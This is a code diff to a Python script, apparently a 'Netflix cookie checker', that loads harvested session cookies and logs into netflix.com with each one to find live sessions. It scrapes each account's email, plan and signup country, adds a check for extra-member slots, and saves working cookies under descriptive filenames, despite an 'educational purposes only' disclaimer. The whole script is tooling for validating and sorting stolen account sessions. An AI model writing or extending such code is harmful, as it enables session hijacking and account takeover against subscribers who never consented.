@@ -1,5 +1,6 @@
 import json
 import os
+import re
 import sys
 import time
 import requests
@@ -18,10 +19,14 @@ exceptions = 0
 working_cookies = 0
 expired_cookies = 0
 duplicate_cookies = 0
+extra_memberships = 0
 start = time.time()
 plan = None
 email = None
 ID = None
+info = None
+extra_members = None
+country = None
 
 lock = Lock()
 num_threads = 5  # Define the maximum number of threads here
@@ -35,7 +40,22 @@ num_threads = 5  # Define the maximum number of threads here
 # | > 100 Mbps    | 10-20                   |
 # |_________________________________________|
 
-max_retries = 5  # Define the maximum number of retries
+max_retries = 3  # Define the maximum number of retries
+
+
+def extract_info(response_text):
+    patterns = {
+        'countryOfSignup': r'"countryOfSignup":\s*"([^"]+)"',
+        'localizedPlanName': r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)\"'
+    }
+    extracted_info = {key: re.search(pattern, response_text).group(1) if re.search(pattern, response_text) else None for
+                      key, pattern in patterns.items()}
+
+    if extracted_info['localizedPlanName']:
+        extracted_info['localizedPlanName'] = extracted_info['localizedPlanName'].replace('x28', '').replace('\\',
+                                                                                                             ' ').replace(
+            'x20', '').replace('x29', '')
+    return extracted_info
 
 
 def load_cookies_from_json(json_cookies_path):
@@ -44,8 +64,15 @@ def load_cookies_from_json(json_cookies_path):
     return cookie
 
 
+def decode_unicode_escapes(s):
+    if re.search(r'\\u[0-9A-Fa-f]{4}', s) or re.search(r'\\U[0-9A-Fa-f]{8}', s):
+        decoded_string = s.encode('latin-1').decode('unicode-escape')
+        return decoded_string
+    return s
+
+
 def open_webpage_with_cookies(session, link, json_cookies, filename):
-    global working_cookies, expired_cookies, plan, email, duplicate_cookies, ID
+    global working_cookies, expired_cookies, plan, email, duplicate_cookies, ID, info, extra_memberships, extra_members, country
 
     session.cookies.clear()
 
@@ -60,7 +87,15 @@ def open_webpage_with_cookies(session, link, json_cookies, filename):
             response = session.get(link)
             response.raise_for_status()
             content = response.text
+            info = extract_info(content)
             soup = BeautifulSoup(content, "lxml")
+
+            response = session.get("https://www.netflix.com/accountowner/addextramember", allow_redirects=False)
+            if response.status_code == 200:
+                extra_memberships += 1
+                extra_members = True
+            else:
+                extra_members = False
 
             if soup.find(string="Sign In") or soup.find(string="Sign in"):
                 with lock:
@@ -72,18 +107,40 @@ def open_webpage_with_cookies(session, link, json_cookies, filename):
             else:
                 with lock:
                     try:
-                        plan = (
-                            soup.select_one(
-                                "div.account-section:nth-child(2) > section:nth-child(2) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > b:nth-child(1)"
-                            ).text
-                            or soup.select_one(".default-ltr-cache-10ajupv").text
-                            or soup.select_one(
-                                "html.js-focus-visible body div#appMountPoint div div.default-ltr-cache-0 div.default-ltr-cache-1w02yd5.el0v7282 section div.default-ltr-cache-1fhvoso.eslj5pt1 div.default-ltr-cache-1grpxuk.eslj5pt0 div.default-ltr-cache-1tmwau.ew2l6qe0 div.default-ltr-cache-1fhvoso.eslj5pt1 div.default-ltr-cache-1u7ywyk.eslj5pt0 div.default-ltr-cache-1rlft14.e1bbao1b0 div.default-ltr-cache-16dvsg3.el0v7280 section.default-ltr-cache-1d3w5wq div.default-ltr-cache-1nca7k1.e19xx6v36 div.default-ltr-cache-q8smu4.e19xx6v35 div.default-ltr-cache-1cr1i8r.e19xx6v33 h3.default-ltr-cache-10ajupv.e19xx6v32"
-                            ).text
-                            or soup.select_one(
-                                "/html/body/div[1]/div/div/div/section/div[2]/div/div/div/div/div/div[2]/section/div[2]/div/div[2]/h3"
-                            ).text
-                        )
+                        plan = decode_unicode_escapes(
+                            info['localizedPlanName'].replace("miembro u00A0extra", "(Shared Extra Member)"))
+                        if plan == " u00D6zel":
+                            try:
+                                plan = (
+                                               soup.select_one(
+                                                   "div.account-section:nth-child(2) > section:nth-child(2) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > b:nth-child(1)"
+                                               ).text
+                                               or soup.select_one(".default-ltr-cache-10ajupv").text
+                                               or soup.select_one(
+                                                "html.js-focus-visible body div#appMountPoint div div.default-ltr-cache-0 div.default-ltr-cache-1w02yd5.el0v7282 section div.default-ltr-cache-1fhvoso.eslj5pt1 div.default-ltr-cache-1grpxuk.eslj5pt0 div.default-ltr-cache-1tmwau.ew2l6qe0 div.default-ltr-cache-1fhvoso.eslj5pt1 div.default-ltr-cache-1u7ywyk.eslj5pt0 div.default-ltr-cache-1rlft14.e1bbao1b0 div.default-ltr-cache-16dvsg3.el0v7280 section.default-ltr-cache-1d3w5wq div.default-ltr-cache-1nca7k1.e19xx6v36 div.default-ltr-cache-q8smu4.e19xx6v35 div.default-ltr-cache-1cr1i8r.e19xx6v33 h3.default-ltr-cache-10ajupv.e19xx6v32"
+                                                ).text
+                                               or soup.select_one(
+                                                "/html/body/div[1]/div/div/div/section/div[2]/div/div/div/div/div/div[2]/section/div[2]/div/div[2]/h3"
+                                                ).text
+                                       ) or info['localizedPlanName'].replace("miembro u00A0extra", "(Extra Member)")
+
+                            except AttributeError:
+                                plan = (
+                                    "Premium"
+                                    if soup.find(string="Premium")
+                                    else (
+                                        "Basic"
+                                        if soup.find(string="Basic")
+                                        else (
+                                            "Standard"
+                                            if soup.find(string="Standard")
+                                            else "Unknown"
+                                        )
+                                    )
+                                )
+
+                        country = info['countryOfSignup']
+
                         email = soup.select_one(".account-section-email").text
                     except AttributeError:
                         plan = (
@@ -121,7 +178,7 @@ def open_webpage_with_cookies(session, link, json_cookies, filename):
 
 
 def process_cookie_file(filename):
-    global duplicate_cookies, working_cookies, exceptions
+    global duplicate_cookies, working_cookies, exceptions, extra_memberships
     filepath = os.path.join("json_cookies", filename)
     if os.path.isfile(filepath):
         url = "https://www.netflix.com/YourAccount"
@@ -133,14 +190,21 @@ def process_cookie_file(filename):
                         "_comment": "Cookie Checked by https://github.com/matheeshapathirana/Netflix-cookie-checker",
                         "Credits": "Matheesha Pathirana",
                         "Discord Server": "https://discord.gg/RSCdKeKB5X",
-                        "Special Thanks": "- To all the contributors who have helped improve this project by submitting pull requests.\n- To everyone who has starred the project and supported our work",
+                        "Special Thanks": "To all the contributors who have helped improve this project by submitting pull requests and to everyone who has starred the project and supported our work",
                         "Disclaimer": "This project is for educational purposes only. The authors and contributors are not responsible for how it is used.",
                         "Support": "If you find this project helpful, consider supporting it by starring the project on GitHub, contributing to the code, or making a donation on Ko-fi. Your support helps keep the project alive and encourages further improvements!",
                     }
                     cookies.append(additional_json)
-                    working_cookie_path = os.path.join(
-                        working_cookies_path, f"[{email}] - {plan}.json"
-                    )
+
+                    if extra_members:
+                        working_cookie_path = os.path.join(
+                            working_cookies_path, f"[{country}] [{email}] - {plan} - Extra Membership.json"
+                        )
+                        extra_memberships += 1
+                    else:
+                        working_cookie_path = os.path.join(
+                            working_cookies_path, f"[{country}] [{email}] - {plan}.json"
+                        )
 
                     with lock:
                         if os.path.isfile(working_cookie_path):
@@ -152,14 +216,14 @@ def process_cookie_file(filename):
                             duplicate_cookies += 1
                         else:
                             with open(
-                                working_cookie_path, "w", encoding="utf-8"
+                                    working_cookie_path, "w", encoding="utf-8"
                             ) as json_file:
                                 json.dump(cookies, json_file, indent=4)
                                 working_cookies += 1
 
                             print(
                                 Fore.GREEN
-                                + f"[✔️] Cookie Working - {filename} | Plan: {plan} | Email: {email}"
+                                + f"[✔️] Cookie Working - [{country}] {filename} | Plan: {plan} | Email: {email} | Extra membership: {extra_members}"
                                 + Fore.RESET
                             )
         except json.decoder.JSONDecodeError:
@@ -226,8 +290,8 @@ try:
     end = time.time()
     print(
         Fore.YELLOW + f"==================================="
-        f"\nSummary:\nTotal Cookies: {len(os.listdir('json_cookies'))}\nWorking Cookies: {working_cookies}\nExpired Cookies: {expired_cookies}\nDuplicate Cookies: {duplicate_cookies}\nInvalid Cookies: {exceptions}\nTime Elapsed: {round((end - start))} Seconds"
-        f"\n=================================" + Fore.RESET
+                      f"\nSummary:\nTotal Cookies: {len(os.listdir('json_cookies'))}\nWorking Cookies: {working_cookies}\nExtra Membership Cookies: {extra_memberships}\nExpired Cookies: {expired_cookies}\nDuplicate Cookies: {duplicate_cookies}\nInvalid Cookies: {exceptions}\nTime Elapsed: {round((end - start))} Seconds"
+                      f"\n=================================" + Fore.RESET
     )
 except KeyboardInterrupt:
     print(Fore.RED + "\n\n[⚠️] Program Interrupted by user" + Fore.RESET)
